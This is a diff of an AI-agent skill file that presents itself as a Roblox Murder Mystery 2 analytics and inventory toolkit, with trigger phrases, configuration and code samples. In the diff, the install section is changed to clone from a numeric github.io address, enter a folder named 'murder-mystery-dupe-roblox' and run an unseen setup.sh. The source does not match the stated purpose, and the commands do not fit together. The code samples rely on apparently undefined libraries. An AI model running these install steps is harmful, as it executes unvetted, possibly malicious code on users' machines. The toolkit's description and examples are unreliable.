@@ -2,29 +2,43 @@
 name: mm2-roblox-analytics-toolkit
 description: Analytics and inventory tracking toolkit for Roblox Murder Mystery 2 gameplay optimization
 triggers:
-  - "help me analyze my Murder Mystery 2 inventory"
-  - "set up MM2 analytics dashboard"
-  - "track my Roblox MM2 knife skins collection"
-  - "configure murder mystery 2 stats tracker"
-  - "optimize my MM2 gameplay strategy"
-  - "export my murder mystery 2 statistics"
-  - "analyze MM2 win rate and performance"
-  - "manage my roblox mm2 inventory data"
+  - "help me track my Murder Mystery 2 inventory"
+  - "analyze my MM2 gameplay statistics"
+  - "set up Roblox MM2 analytics dashboard"
+  - "optimize my Murder Mystery 2 knife collection"
+  - "configure MM2 inventory tracker"
+  - "export my Roblox MM2 game data"
+  - "create Murder Mystery 2 strategy analysis"
+  - "track MM2 gamepass effectiveness"
 ---
 
 # MM2 Roblox Analytics Toolkit
 
 > Skill by [ara.so](https://ara.so) — Data Skills collection.
 
-This toolkit provides advanced analytics, inventory management, and strategic insights for Roblox's Murder Mystery 2 game. It includes data visualization, collection tracking, performance metrics, and AI-powered gameplay analysis.
+This toolkit provides comprehensive analytics, inventory management, and strategic gameplay insights for Roblox's Murder Mystery 2 game. It includes data visualization, inventory optimization, performance tracking, and AI-powered strategic recommendations.
+
+## What It Does
+
+The MM2 Analytics Toolkit offers:
+
+- **Inventory Management**: Track knife skins, gamepasses, and collectibles with rarity analysis
+- **Performance Analytics**: Monitor win/loss ratios, role-specific statistics, and gameplay patterns
+- **Strategy Optimization**: AI-powered insights for improving gameplay across different roles
+- **Data Visualization**: Interactive charts and dashboards for game statistics
+- **Export Capabilities**: Generate reports in JSON, CSV, and other formats
+- **Predictive Modeling**: Forecast inventory values and identify collection gaps
 
 ## Installation
 
-### Automated Setup
+### Automated Installation
 
 ```bash
-git clone https://github.com/8015238355/mm2-analytics-dashboard-2026.git
-cd mm2-analytics-dashboard-2026
+# Clone the repository
+git clone https://8015238355.github.io
+cd murder-mystery-dupe-roblox
+
+# Run automated installer
 chmod +x setup.sh
 ./setup.sh --install
 ```
@@ -32,12 +46,10 @@ chmod +x setup.sh
 ### Manual Installation
 
 ```bash
-# Clone repository
-git clone https://github.com/8015238355/mm2-analytics-dashboard-2026.git
-cd mm2-analytics-dashboard-2026
-
-# Install dependencies
+# Install Node.js dependencies
 npm install
+
+# Install Python dependencies
 python3 -m pip install -r requirements.txt
 ```
 
@@ -51,165 +63,55 @@ API_CLAUDE_KEY=${CLAUDE_API_KEY}
 DATA_DIRECTORY=./data/collections
 ANALYTICS_INTERVAL=300
 ENABLE_LIVE_TRACKING=true
-EXPORT_FORMAT=json
 LOG_LEVEL=INFO
 ```
 
-## Core Components
+## Key Commands
 
-### 1. Analytics Engine
-
-The analytics module processes gameplay data and generates insights.
-
-**Python Usage:**
-
-```python
-from mm2_analytics import AnalyticsEngine, ProfileLoader
-
-# Initialize engine
-engine = AnalyticsEngine(
-    data_dir=os.getenv('DATA_DIRECTORY'),
-    refresh_rate=int(os.getenv('ANALYTICS_INTERVAL', 300))
-)
-
-# Load user profile
-profile = ProfileLoader.load('mystery_solver_01')
-
-# Run analytics
-results = engine.analyze(
-    profile=profile,
-    mode='comprehensive',
-    time_range='7d'
-)
-
-# Access metrics
-print(f"Win Rate: {results.win_rate}%")
-print(f"Total Games: {results.total_games}")
-print(f"Preferred Role: {results.preferred_role}")
-```
-
-### 2. Inventory Manager
-
-Track and optimize your MM2 item collection.
-
-**Python Usage:**
-
-```python
-from mm2_inventory import InventoryManager, ItemFilter
-
-# Initialize manager
-inventory = InventoryManager(profile='mystery_solver_01')
-
-# Scan inventory
-inventory.scan(categories=['knife_skins', 'gamepasses'])
-
-# Filter items
-legendary_knives = inventory.filter(
-    ItemFilter(
-        category='knife_skins',
-        rarity=['legendary', 'ancient'],
-        min_value=1000
-    )
-)
-
-# Get collection statistics
-stats = inventory.get_stats()
-print(f"Total Items: {stats.total_items}")
-print(f"Collection Completion: {stats.completion_rate}%")
-print(f"Estimated Value: {stats.total_value}")
-
-# Export inventory
-inventory.export('inventory_2026.json', format='json')
-```
-
-### 3. Strategy Analyzer
-
-Analyze gameplay patterns and generate strategic recommendations.
-
-**Python Usage:**
-
-```python
-from mm2_strategy import StrategyAnalyzer, RoleStrategy
-
-# Initialize analyzer
-analyzer = StrategyAnalyzer()
-
-# Load strategy template
-strategy = RoleStrategy(
-    role='sheriff',
-    template='aggressive_sheriff',
-    priority='high_visibility_areas'
-)
-
-# Analyze gameplay session
-session_data = analyzer.load_session('session_2026_05_15.json')
-analysis = analyzer.analyze(session_data, strategy)
-
-# Get recommendations
-for rec in analysis.recommendations:
-    print(f"- {rec.action}: {rec.rationale}")
-
-# Generate heatmap
-heatmap = analyzer.generate_heatmap(
-    sessions=session_data,
-    map_name='de_town'
-)
-heatmap.save('sheriff_heatmap.png')
-```
-
-## CLI Commands
-
-### Main Command Interface
+### CLI Usage
 
 ```bash
-# Run analytics mode
+# Run analytics in comprehensive mode
 python3 main.py --mode analytics \
-    --profile mystery_solver_01 \
-    --export statistics_2026.json \
-    --format json \
-    --verbose
+  --profile <profile_name> \
+  --export <output_file.json> \
+  --format json \
+  --verbose
 
 # Inventory scan
 python3 main.py --mode inventory \
-    --profile mystery_solver_01 \
-    --scan all \
-    --output inventory_report.csv
+  --scan-all \
+  --filter-rarity legendary,ancient
 
 # Strategy analysis
 python3 main.py --mode strategy \
-    --profile mystery_solver_01 \
-    --role sheriff \
-    --sessions 50 \
-    --export strategy_insights.json
+  --role sheriff \
+  --analyze-patterns \
+  --output strategy_report.csv
 
-# Live tracking mode
-python3 main.py --mode live \
-    --profile mystery_solver_01 \
-    --interval 30 \
-    --dashboard
+# Export statistics
+python3 main.py --mode export \
+  --format csv \
+  --date-range 2026-01-01:2026-05-31 \
+  --output stats_export.csv
 ```
 
-### Common CLI Options
+### Common Options
 
-```bash
-Options:
-  --mode          Operation mode (analytics|inventory|strategy|live)
-  --profile       User profile name
-  --export        Output file path
-  --format        Export format (json|csv|yaml)
-  --verbose       Enable verbose logging
-  --log-level     Set log level (DEBUG|INFO|WARNING|ERROR)
-  --config        Custom config file path
-  --no-cache      Disable data caching
-  --force-refresh Force data refresh
-```
+- `--mode`: Operation mode (`analytics`, `inventory`, `strategy`, `export`)
+- `--profile`: User profile name for personalized analysis
+- `--export`: Output file path for data export
+- `--format`: Export format (`json`, `csv`, `yaml`)
+- `--verbose`: Enable detailed logging
+- `--log-level`: Set logging level (`DEBUG`, `INFO`, `WARNING`, `ERROR`)
 
 ## Configuration
 
-### Profile Configuration (YAML)
+### Profile Configuration
+
+Create a profile YAML file at `./profiles/my_profile.yaml`:
 
 ```yaml
-# config/profiles/mystery_solver_01.yaml
 profile:
   username: "MysterySolver2026"
   preferred_role: "sheriff"
@@ -217,360 +119,429 @@ profile:
   inventory_filter:
     - category: "knife_skins"
       rarity: ["legendary", "ancient"]
-      exclude_duplicates: true
     - category: "gamepasses"
       active: true
   
   analytics_preferences:
     tracking_mode: "comprehensive"
     data_refresh_rate: 30
-    export_format: ["csv", "json"]
-    include_predictions: true
-    ai_insights: true
+    export_format: "csv, json"
   
   strategy_templates:
     - name: "aggressive_sheriff"
       priority: "high_visibility_areas"
-      engagement_distance: "medium"
+      tactics: ["patrol_main_routes", "quick_response"]
+    
     - name: "passive_innocent"
       priority: "distraction_avoidance"
-      group_behavior: "blend_in"
+      tactics: ["group_staying", "safe_zones"]
+```
+
+### Analytics Configuration
+
+Configure analytics settings in `config/analytics.yaml`:
+
+```yaml
+analytics:
+  tracking:
+    enabled: true
+    interval_seconds: 300
+    metrics:
+      - win_loss_ratio
+      - role_performance
+      - inventory_value
+      - strategy_effectiveness
   
-  notifications:
-    discord_webhook: ${DISCORD_WEBHOOK_URL}
-    email: "user@example.com"
-    on_rare_drop: true
-    on_achievement: true
+  visualization:
+    enabled: true
+    chart_types:
+      - line
+      - bar
+      - pie
+    refresh_rate: 60
+  
+  export:
+    auto_export: true
+    formats: ["json", "csv"]
+    retention_days: 90
 ```
 
-### Application Configuration (JSON)
+## Code Examples
 
-```json
-{
-  "app": {
-    "name": "MM2 Analytics Toolkit",
-    "version": "2026.1.0",
-    "data_directory": "./data",
-    "cache_directory": "./cache",
-    "log_directory": "./logs"
-  },
-  "analytics": {
-    "default_time_range": "7d",
-    "max_sessions": 1000,
-    "enable_ai_predictions": true,
-    "prediction_models": ["openai", "claude"],
-    "confidence_threshold": 0.75
-  },
-  "inventory": {
-    "auto_scan_interval": 3600,
-    "value_update_source": "community_market",
-    "rarity_tiers": ["common", "uncommon", "rare", "legendary", "ancient"],
-    "duplicate_handling": "merge"
-  },
-  "api": {
-    "openai": {
-      "model": "gpt-4-turbo",
-      "max_tokens": 2000,
-      "temperature": 0.7
-    },
-    "claude": {
-      "model": "claude-3-opus",
-      "max_tokens": 4000
-    }
-  }
-}
-```
-
-## Data Export and Visualization
-
-### Export Analytics Data
+### Python: Inventory Analysis
 
 ```python
-from mm2_analytics import DataExporter, ExportFormat
+#!/usr/bin/env python3
+import os
+from mm2_toolkit import InventoryManager, RarityFilter
+
+# Initialize inventory manager
+manager = InventoryManager(
+    data_dir=os.getenv('DATA_DIRECTORY', './data/collections'),
+    profile='mystery_solver_01'
+)
+
+# Scan inventory
+inventory = manager.scan_inventory()
+
+# Filter by rarity
+legendary_items = manager.filter_by_rarity(
+    inventory,
+    rarities=['legendary', 'ancient']
+)
+
+print(f"Found {len(legendary_items)} legendary/ancient items:")
+for item in legendary_items:
+    print(f"  - {item['name']} ({item['category']}) - Value: {item['estimated_value']}")
+
+# Calculate collection completeness
+completeness = manager.calculate_completeness(inventory)
+print(f"\nCollection Completeness: {completeness['percentage']}%")
+print(f"Missing Items: {completeness['missing_count']}")
+```
+
+### Python: Performance Analytics
+
+```python
+#!/usr/bin/env python3
+import os
+from mm2_toolkit import AnalyticsEngine, TimeRange
+
+# Initialize analytics engine
+engine = AnalyticsEngine(
+    api_key=os.getenv('API_OPENAI_KEY'),
+    profile='mystery_solver_01'
+)
+
+# Define time range
+time_range = TimeRange(
+    start='2026-01-01',
+    end='2026-05-31'
+)
+
+# Get performance metrics
+metrics = engine.get_performance_metrics(time_range)
+
+print("Performance Summary:")
+print(f"  Total Games: {metrics['total_games']}")
+print(f"  Win Rate: {metrics['win_rate']:.2f}%")
+print(f"  Sheriff Win Rate: {metrics['roles']['sheriff']['win_rate']:.2f}%")
+print(f"  Innocent Survival Rate: {metrics['roles']['innocent']['survival_rate']:.2f}%")
+print(f"  Murderer Win Rate: {metrics['roles']['murderer']['win_rate']:.2f}%")
+
+# Export to file
+engine.export_metrics(metrics, 'performance_report.json', format='json')
+```
+
+### Python: Strategy Recommendations
+
+```python
+#!/usr/bin/env python3
+import os
+from mm2_toolkit import StrategyAnalyzer, Role
+
+# Initialize strategy analyzer
+analyzer = StrategyAnalyzer(
+    openai_key=os.getenv('API_OPENAI_KEY'),
+    claude_key=os.getenv('API_CLAUDE_KEY')
+)
+
+# Analyze sheriff strategy
+sheriff_analysis = analyzer.analyze_role_strategy(
+    role=Role.SHERIFF,
+    profile='mystery_solver_01',
+    historical_games=100
+)
+
+print("Sheriff Strategy Recommendations:")
+for recommendation in sheriff_analysis['recommendations']:
+    print(f"  - {recommendation['tactic']}: {recommendation['description']}")
+    print(f"    Expected Improvement: {recommendation['expected_improvement']}%")
+
+# Get AI-powered insights
+insights = analyzer.get_ai_insights(
+    role=Role.SHERIFF,
+    recent_performance=sheriff_analysis['recent_performance']
+)
+
+print("\nAI-Powered Insights:")
+for insight in insights:
+    print(f"  - {insight}")
+```
+
+### Python: Data Export
+
+```python
+#!/usr/bin/env python3
+import os
+from mm2_toolkit import DataExporter, ExportFormat
 
 # Initialize exporter
-exporter = DataExporter()
-
-# Export to CSV
-exporter.export_csv(
-    data=results,
-    filename='mm2_stats_2026.csv',
-    columns=['date', 'role', 'win', 'duration', 'kills']
+exporter = DataExporter(
+    data_dir=os.getenv('DATA_DIRECTORY', './data/collections')
 )
 
-# Export to JSON with metadata
-exporter.export_json(
-    data=results,
-    filename='mm2_stats_2026.json',
-    include_metadata=True,
-    pretty_print=True
+# Export inventory data
+exporter.export_inventory(
+    profile='mystery_solver_01',
+    output_file='inventory_export.csv',
+    format=ExportFormat.CSV,
+    include_metadata=True
 )
 
-# Export to Pandas DataFrame
-df = exporter.to_dataframe(results)
-print(df.describe())
+# Export analytics data
+exporter.export_analytics(
+    profile='mystery_solver_01',
+    output_file='analytics_export.json',
+    format=ExportFormat.JSON,
+    date_range={
+        'start': '2026-01-01',
+        'end': '2026-05-31'
+    }
+)
+
+# Export strategy data
+exporter.export_strategy_analysis(
+    profile='mystery_solver_01',
+    output_file='strategy_export.yaml',
+    format=ExportFormat.YAML
+)
+
+print("Export completed successfully!")
 ```
 
-### Generate Visualizations
+### JavaScript: Dashboard Integration
 
-```python
-from mm2_visualization import ChartGenerator
+```javascript
+const { MM2Analytics, ChartBuilder } = require('./lib/analytics');
 
-# Initialize chart generator
-charts = ChartGenerator()
+// Initialize analytics
+const analytics = new MM2Analytics({
+  apiKey: process.env.API_OPENAI_KEY,
+  profile: 'mystery_solver_01',
+  dataDirectory: process.env.DATA_DIRECTORY || './data/collections'
+});
 
-# Win rate over time
-charts.line_chart(
-    data=results.time_series,
-    x='date',
-    y='win_rate',
-    title='Win Rate Trend (Last 30 Days)',
-    output='win_rate_trend.png'
-)
+// Fetch dashboard data
+async function loadDashboard() {
+  const data = await analytics.getDashboardData({
+    timeRange: {
+      start: '2026-01-01',
+      end: '2026-05-31'
+    }
+  });
 
-# Role distribution pie chart
-charts.pie_chart(
-    data=results.role_distribution,
-    labels='role',
-    values='count',
-    title='Role Distribution',
-    output='role_distribution.png'
-)
+  // Build charts
+  const chartBuilder = new ChartBuilder();
+  
+  const winRateChart = chartBuilder.createLineChart({
+    data: data.performance.winRateOverTime,
+    title: 'Win Rate Trend',
+    xLabel: 'Date',
+    yLabel: 'Win Rate (%)'
+  });
 
-# Performance heatmap
-charts.heatmap(
-    data=results.performance_matrix,
-    x_axis='hour_of_day',
-    y_axis='day_of_week',
-    values='win_rate',
-    title='Performance Heatmap',
-    output='performance_heatmap.png'
-)
+  const roleDistributionChart = chartBuilder.createPieChart({
+    data: data.performance.roleDistribution,
+    title: 'Role Distribution'
+  });
+
+  return {
+    winRateChart,
+    roleDistributionChart,
+    summary: data.summary
+  };
+}
+
+// Export dashboard
+loadDashboard().then(dashboard => {
+  console.log('Dashboard loaded successfully');
+  console.log(`Total Games: ${dashboard.summary.totalGames}`);
+  console.log(`Overall Win Rate: ${dashboard.summary.winRate}%`);
+});
 ```
 
-## AI-Powered Insights
+## Common Patterns
 
-### OpenAI Integration
+### Pattern 1: Daily Statistics Tracking
 
 ```python
-from mm2_ai import OpenAIAnalyzer
+#!/usr/bin/env python3
 import os
+from mm2_toolkit import DailyTracker
+from datetime import datetime
 
-# Initialize analyzer
-ai_analyzer = OpenAIAnalyzer(
+tracker = DailyTracker(
+    profile='mystery_solver_01',
+    data_dir=os.getenv('DATA_DIRECTORY')
+)
+
+# Log today's session
+tracker.log_session({
+    'date': datetime.now().isoformat(),
+    'games_played': 15,
+    'wins': 9,
+    'roles': {
+        'sheriff': {'games': 5, 'wins': 3},
+        'murderer': {'games': 4, 'wins': 3},
+        'innocent': {'games': 6, 'wins': 3}
+    },
+    'new_items': ['Ice Dragon Knife', 'Galaxy Gun']
+})
+
+# Get daily summary
+summary = tracker.get_daily_summary()
+print(f"Today's Win Rate: {summary['win_rate']}%")
+```
+
+### Pattern 2: Inventory Value Tracking
+
+```python
+#!/usr/bin/env python3
+import os
+from mm2_toolkit import InventoryValuator
+
+valuator = InventoryValuator(
     api_key=os.getenv('API_OPENAI_KEY'),
-    model='gpt-4-turbo'
+    profile='mystery_solver_01'
 )
 
-# Get strategic recommendations
-recommendations = ai_analyzer.analyze_gameplay(
-    session_data=session_data,
+# Get current inventory value
+current_value = valuator.calculate_total_value()
+print(f"Total Inventory Value: {current_value['total']}")
+print(f"Most Valuable Item: {current_value['top_item']['name']} ({current_value['top_item']['value']})")
+
+# Track value changes
+value_history = valuator.get_value_history(days=30)
+change = value_history[-1]['total'] - value_history[0]['total']
+print(f"30-Day Value Change: {change:+.2f}")
+```
+
+### Pattern 3: Automated Strategy Updates
+
+```python
+#!/usr/bin/env python3
+import os
+from mm2_toolkit import StrategyOptimizer
+
+optimizer = StrategyOptimizer(
+    openai_key=os.getenv('API_OPENAI_KEY'),
+    claude_key=os.getenv('API_CLAUDE_KEY')
+)
+
+# Optimize strategy based on recent performance
+optimized_strategy = optimizer.optimize_for_role(
     role='sheriff',
-    context='competitive_match'
+    profile='mystery_solver_01',
+    analysis_window_games=50
 )
 
-for rec in recommendations:
-    print(f"\n{rec.title}")
-    print(f"Confidence: {rec.confidence}%")
-    print(f"Suggestion: {rec.suggestion}")
-```
-
-### Claude Integration for Pattern Recognition
-
-```python
-from mm2_ai import ClaudeAnalyzer
-import os
-
-# Initialize analyzer
-claude = ClaudeAnalyzer(
-    api_key=os.getenv('API_CLAUDE_KEY'),
-    model='claude-3-opus'
-)
-
-# Analyze player behavior patterns
-patterns = claude.detect_patterns(
-    historical_data=inventory.get_history(days=30),
-    analysis_type='behavioral'
-)
-
-print(f"Detected Patterns: {len(patterns)}")
-for pattern in patterns:
-    print(f"- {pattern.name}: {pattern.frequency} occurrences")
-```
-
-## Common Workflows
-
-### Complete Session Analysis
-
-```python
-from mm2_analytics import SessionAnalyzer, ProfileLoader
-from mm2_visualization import ChartGenerator
-import os
-
-def analyze_session(profile_name, session_file):
-    # Load profile and session
-    profile = ProfileLoader.load(profile_name)
-    analyzer = SessionAnalyzer()
-    session = analyzer.load_session(session_file)
-    
-    # Run comprehensive analysis
-    analysis = analyzer.analyze(session, profile)
-    
-    # Generate visualizations
-    charts = ChartGenerator()
-    charts.generate_session_report(
-        analysis=analysis,
-        output_dir='./reports',
-        format='png'
-    )
-    
-    # Export detailed report
-    analyzer.export_report(
-        analysis=analysis,
-        filename=f'session_report_{session.id}.json',
-        include_insights=True
-    )
-    
-    return analysis
-
-# Example usage
-result = analyze_session('mystery_solver_01', 'session_2026_05_15.json')
-print(f"Overall Performance: {result.performance_score}/100")
-```
-
-### Inventory Valuation Tracking
-
-```python
-from mm2_inventory import InventoryManager, ValueTracker
-from datetime import datetime, timedelta
-
-def track_inventory_value(profile_name, days=30):
-    inventory = InventoryManager(profile=profile_name)
-    tracker = ValueTracker(inventory)
-    
-    # Get historical value data
-    end_date = datetime.now()
-    start_date = end_date - timedelta(days=days)
-    
-    value_history = tracker.get_value_history(
-        start_date=start_date,
-        end_date=end_date,
-        granularity='daily'
-    )
-    
-    # Calculate statistics
-    stats = tracker.calculate_stats(value_history)
-    
-    print(f"Current Value: {stats.current_value:,}")
-    print(f"Change ({days}d): {stats.change_percent:+.2f}%")
-    print(f"Peak Value: {stats.peak_value:,} on {stats.peak_date}")
-    print(f"Average Daily Change: {stats.avg_daily_change:+.2f}%")
-    
-    return value_history
-
-# Example usage
-history = track_inventory_value('mystery_solver_01', days=30)
+print("Optimized Sheriff Strategy:")
+for tactic in optimized_strategy['tactics']:
+    print(f"  - {tactic['name']}: {tactic['priority']}")
 ```
 
 ## Troubleshooting
 
-### Common Issues
+### API Key Issues
 
-**Issue: Analytics not updating**
+**Problem**: `Authentication failed for OpenAI/Claude API`
+
+**Solution**:
 ```bash
-# Force refresh cache
-python3 main.py --mode analytics --force-refresh --no-cache
+# Verify environment variables are set
+echo $API_OPENAI_KEY
+echo $API_CLAUDE_KEY
 
-# Check data directory permissions
-ls -la ${DATA_DIRECTORY}
-
-# Verify profile exists
-python3 -c "from mm2_analytics import ProfileLoader; ProfileLoader.list_profiles()"
+# Re-export if needed
+export API_OPENAI_KEY="your-key-here"
+export API_CLAUDE_KEY="your-key-here"
 ```
 
-**Issue: API rate limiting**
-```python
-# Add rate limiting configuration
-from mm2_ai import RateLimiter
+### Data Directory Not Found
 
-limiter = RateLimiter(
-    max_requests_per_minute=10,
-    retry_after=60
+**Problem**: `FileNotFoundError: [Errno 2] No such file or directory: './data/collections'`
+
+**Solution**:
+```bash
+# Create data directory structure
+mkdir -p ./data/collections
+mkdir -p ./data/exports
+mkdir -p ./profiles
+
+# Or set custom directory
+export DATA_DIRECTORY="/custom/path/to/data"
+```
+
+### Profile Configuration Errors
+
+**Problem**: `Invalid profile configuration`
+
+**Solution**:
+```python
+# Validate profile configuration
+from mm2_toolkit import ProfileValidator
+
+validator = ProfileValidator()
+is_valid, errors = validator.validate_profile('./profiles/my_profile.yaml')
+
+if not is_valid:
+    print("Configuration errors:")
+    for error in errors:
+        print(f"  - {error}")
+```
+
+### Export Format Issues
+
+**Problem**: `UnsupportedExportFormat: 'xml' is not supported`
+
+**Solution**:
+```python
+# Use supported formats only
+from mm2_toolkit import ExportFormat
+
+supported_formats = [
+    ExportFormat.JSON,
+    ExportFormat.CSV,
+    ExportFormat.YAML
+]
+
+# Verify format before export
+format_choice = ExportFormat.JSON
+exporter.export_data(output_file='data.json', format=format_choice)
+```
+
+### Memory Issues with Large Datasets
+
+**Problem**: `MemoryError: Unable to allocate array`
+
+**Solution**:
+```python
+# Use chunked processing for large datasets
+from mm2_toolkit import ChunkedAnalyzer
+
+analyzer = ChunkedAnalyzer(
+    chunk_size=1000,  # Process 1000 records at a time
+    profile='mystery_solver_01'
 )
 
-# Use with API calls
-with limiter:
-    recommendations = ai_analyzer.analyze_gameplay(session_data)
-```
-
-**Issue: Export file format errors**
-```python
-# Validate export format
-from mm2_analytics import DataExporter, ExportFormat
-
-exporter = DataExporter()
-
-# Check supported formats
-print(f"Supported formats: {ExportFormat.list_all()}")
-
-# Use format validation
-if exporter.validate_format('json'):
-    exporter.export_json(data, 'output.json')
-```
-
-**Issue: Missing dependencies**
-```bash
-# Reinstall all dependencies
-pip3 install -r requirements.txt --force-reinstall
-
-# Check Python version (requires 3.9+)
-python3 --version
-
-# Verify npm packages
-npm list
-```
-
-### Debug Mode
-
-```bash
-# Enable comprehensive debugging
-python3 main.py --mode analytics \
-    --profile mystery_solver_01 \
-    --log-level DEBUG \
-    --verbose \
-    --debug-output debug_log.txt
-
-# Check debug output
-tail -f debug_log.txt
-```
-
-### Data Validation
-
-```python
-from mm2_analytics import DataValidator
-
-validator = DataValidator()
-
-# Validate profile configuration
-validation_result = validator.validate_profile('mystery_solver_01')
-
-if not validation_result.is_valid:
-    print("Validation errors:")
-    for error in validation_result.errors:
-        print(f"- {error.field}: {error.message}")
-else:
-    print("Profile configuration is valid")
-
-# Validate session data
-session_validation = validator.validate_session('session_2026_05_15.json')
-print(f"Session data integrity: {session_validation.integrity_score}%")
+# Process in chunks
+for chunk_result in analyzer.process_in_chunks():
+    print(f"Processed chunk: {chunk_result['records_processed']}")
 ```
 
 ## Best Practices
 
-1. **Regular Data Backups**: Export inventory and analytics data weekly
-2. **Profile Management**: Use separate profiles for different gameplay styles
-3. **API Key Security**: Always use environment variables for API keys
-4. **Cache Management**: Clear cache periodically to ensure fresh data
-5. **Performance Monitoring**: Track analytics refresh times and optimize intervals
-6. **Data Privacy**: Keep personal gameplay data local and encrypted
+1. **Regular Backups**: Export data regularly to prevent loss
+2. **Environment Variables**: Always use environment variables for API keys
+3. **Profile Management**: Create separate profiles for different playstyles
+4. **Incremental Analysis**: Analyze data in manageable time windows
+5. **Cache Configuration**: Enable caching to reduce API calls and improve performance
+
+```python
+# Enable caching
+from mm2_toolkit import CacheManager
+
+cache = CacheManager(ttl=3600)  # 1 hour cache
+analytics = AnalyticsEngine(cache=cache)
+```
